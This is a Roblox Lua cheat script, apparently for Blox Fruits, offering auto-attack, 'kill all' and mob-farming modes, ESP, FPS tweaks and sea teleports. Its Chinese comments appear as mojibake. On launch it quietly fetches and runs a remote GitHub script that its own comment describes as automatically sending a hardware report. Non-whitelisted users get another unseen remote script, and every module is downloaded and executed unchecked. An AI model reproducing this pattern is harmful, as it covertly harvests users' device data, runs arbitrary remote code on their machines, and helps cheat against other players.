local Players           = game:GetService("Players")
local localPlayer       = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")

if getgenv().NEKO_RUNNING then return end
getgenv().NEKO_RUNNING = true

-- =============================================================
-- ğŸ›¡ï¸ 1. ç§˜å¯†ç‰¹å‹™ P (å•Ÿå‹•æ™‚è‡ªå‹•ç™¼é€ç¡¬é«”å ±å‘Š)
-- =============================================================
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/P"))()
    end)
end)

-- =============================================================
-- ğŸ›¡ï¸ 2. ç™½åå–®é©—è­‰ (å°æ¥ No é é¢)
-- =============================================================
local Whitelist = {
    ["Kadys5373"]      = true, ["Zadrian664"]     = true, ["Zn6xx"]          = true,
    ["jay04_23"]       = true, ["iandsere"]       = true, ["czr_0416"]       = true,
    ["tw_vic2012"]     = true, ["12i21777"]       = true, ["dandanman678"]   = true,
    ["psaabfmiuh"]     = true, ["dt106101zz"]     = true, ["Liu_Ruyancat"]   = true,
    ["030501aaaaaaaaaa"] = true, ["robloxasdft114"] = true, ["iqiqiqiqiqiq188"] = true
}

if not Whitelist[localPlayer.Name] then
    pcall(function() 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/No"))() 
    end)
    return
end

-- =============================================================
-- â™»ï¸ 3. ç’°å¢ƒæ¸…ç†èˆ‡åˆå§‹åŒ–
-- =============================================================
_G.Settings = {
    Mode          = "None",
    CatSpeedValue = 50,
    SpeedEnabled  = false,
    FOV           = 85
}
_G.NekoAttack  = false
_G.NekoESP     = false

-- =============================================================
-- ğŸ“¦ 4. è³‡æºè¼‰å…¥ (é ç«¯å°æ¥ Ui èˆ‡ PvP)
-- =============================================================

-- [A] è¼‰å…¥ä¸»äººåœ¨ GitHub ä¸Šçš„ UI åº«
local success, UIContent = pcall(function() 
    return game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/Ui") 
end)

if not success then return print("ğŸ¾ å°æŸ’æç¤ºï¼šUI åº«è®€å–å¤±æ•—å–µï¼") end
local NekoLib = loadstring(UIContent)()
local myUI, screenGui = NekoLib.new("NEKO BF")

-- [B] ç•°æ­¥è¼‰å…¥ PVP æ ¸å¿ƒ
task.spawn(function()
    pcall(function() 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/PvP"))() 
    end)
end)

-- =============================================================
-- âš”ï¸ 5. è‡ªå‹•æ­¦è£è‰²å¾ªç’°
-- =============================================================
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local char = localPlayer.Character
            if char and not char:FindFirstChild("HasBuso") then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso")
            end
        end)
    end
end)

-- =============================================================
-- ğŸ“¢ 6. ä»‹é¢åŠŸèƒ½å°æ¥ (ä½¿ç”¨è²“è²“æ¨™ç±¤ UI)
-- =============================================================

-- [ åˆ†é  1: ç‹€æ…‹ç›£æ§ ]
local TabInfo = myUI:Tab("å…¬å‘Š / ç‹€æ…‹")
local InfoSec = TabInfo:Section("ğŸ“Š å¯¦æ™‚ç›£æ§")

-- å»ºç«‹æŒ‰éˆ•ä¸¦æŠ“å–ç‰©ä»¶ï¼Œä»¥ä¾¿å¾ŒçºŒæ›´æ–° Text
local BtnAtk = InfoSec:Button("âš”ï¸ æ”»æ“Šï¼šğŸ”´ å·²é—œé–‰", function() end)
local BtnMode = InfoSec:Button("ğŸ§  æ¨¡å¼ï¼šä¼‘æ¯ä¸­", function() end)

-- æ›´æ–°ç‹€æ…‹çš„å¾ªç’°
task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            BtnAtk.Text = "âš”ï¸ æ”»æ“Šï¼š" .. (_G.NekoAttack and "ğŸŸ¢ é‹è¡Œä¸­" or "ğŸ”´ å·²é—œé–‰")
            local m = (_G.Settings.Mode == "Mob" and "è‡ªå‹•æ‰“æ€ª") or (_G.Settings.Mode == "All" and "å…¨æ®ºæ¨¡å¼") or "ä¼‘æ¯ä¸­"
            BtnMode.Text = "ğŸ§  æ¨¡å¼ï¼š" .. m
        end)
    end
end)

-- [ åˆ†é  2: æˆ°é¬¥ç³»çµ± ]
local TabFight = myUI:Tab("æˆ°é¬¥ç³»çµ±")
local F_Core = TabFight:Section("æ ¸å¿ƒæ”¶å‰²ä¸­å¿ƒ")

F_Core:Toggle("å•Ÿå‹•ç¥åˆ€é€£æ“Š (FastAttack)", function(s) 
    _G.NekoAttack = s
    if s and _G.Settings.Mode == "None" then _G.Settings.Mode = "All" end
end)

F_Core:Button("ğŸ§  æ¨¡å¼ï¼šè‡ªå‹•æ‰“æ€ª (Mob)", function() 
    _G.Settings.Mode = "Mob"
    _G.NekoAttack = true 
end)

F_Core:Button("ğŸ”¥ æ¨¡å¼ï¼šå…¨æ®ºæ¨¡å¼ (All)", function() 
    _G.Settings.Mode = "All"
    _G.NekoAttack = true 
end)

F_Core:Button("ğŸ›‘ åœæ­¢æ‰€æœ‰æˆ°é¬¥è¡Œç‚º", function() 
    _G.Settings.Mode = "None"
    _G.NekoAttack = false
end)

-- [ åˆ†é  3: ç’°å¢ƒå„ªåŒ– ]
local TabEnv = myUI:Tab("ç’°å¢ƒå„ªåŒ–")
local V = TabEnv:Section("è¦–è¦ºèˆ‡æ•ˆèƒ½")

V:Toggle("é–‹å•Ÿè²“è²“é€è¦– (ESP)", function(s)
    _G.NekoESP = s
    if s and not _G.ESPLoaded then
        _G.ESPLoaded = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/Esp"))()
    end
end)

V:Button("FPS æ¥µè‡´å„ªåŒ–", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/FPS"))()
end)

-- [ åˆ†é  4: ç§»å‹•å‚³é€ ]
local TabMove = myUI:Tab("ç§»å‹•å‚³é€")
local M = TabMove:Section("è·¨æµ·å¤§æ©‹")

M:Button("å‰å¾€ï¼šä¸€æµ· (Main)", function() ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelMain") end)
M:Button("å‰å¾€ï¼šäºŒæµ· (Dressrosa)", function() ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa") end)
M:Button("å‰å¾€ï¼šä¸‰æµ· (Zou)", function() ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou") end)

-- =============================================================
-- ğŸ¾ 7. æœ€å°åŒ–é–‹é—œ (å®‰å“å¹³æ¿å¤§æŒ‰éˆ•)
-- =============================================================
local MiniBtn = Instance.new("TextButton", screenGui)
MiniBtn.Name = "NekoMainBtn"
MiniBtn.Size = UDim2.new(0, 65, 0, 65)
MiniBtn.Position = UDim2.new(0, 20, 0.5, -32)
MiniBtn.Text = "ğŸ¾"
MiniBtn.TextSize = 30
MiniBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MiniBtn.TextColor3 = Color3.fromRGB(0, 255, 255)
Instance.new("UICorner", MiniBtn).CornerRadius = UDim.new(1, 0)
local Stroke = Instance.new("UIStroke", MiniBtn)
Stroke.Color = Color3.fromRGB(0, 255, 255)
Stroke.Thickness = 2

myUI:AddDrag(MiniBtn)
MiniBtn.MouseButton1Click:Connect(function() myUI:Toggle() end)

